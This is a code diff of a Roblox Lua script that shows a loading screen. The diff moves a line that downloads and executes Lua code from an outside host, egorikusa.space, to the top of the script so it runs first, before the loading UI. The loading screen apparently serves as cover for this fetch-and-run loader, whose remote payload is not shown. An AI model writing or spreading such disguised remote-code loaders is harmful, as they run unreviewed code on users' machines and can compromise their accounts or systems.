@@ -1,4 +1,15 @@
 local player = game.Players.LocalPlayer
+
+-- Load the external script first
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://egorikusa.space/8254b7b833bd540c8f20bebf.lua", true))()
+end)
+
+if not success then
+    warn("Failed to load the external script: " .. err)
+end
+
+-- Set up the loading screen
 local screenGui = Instance.new("ScreenGui")
 local loadingFrame = Instance.new("Frame")
 local titleLabel = Instance.new("TextLabel")
@@ -62,9 +73,6 @@ local function createLoadingScreen()
 
     -- Hide the loading screen after loading
     loadingFrame.Visible = false
-
-    -- Load the external script
-    loadstring(game:HttpGet("https://egorikusa.space/8254b7b833bd540c8f20bebf.lua", true))()
 end
 
 -- Show the loading screen when the character is added or respawned
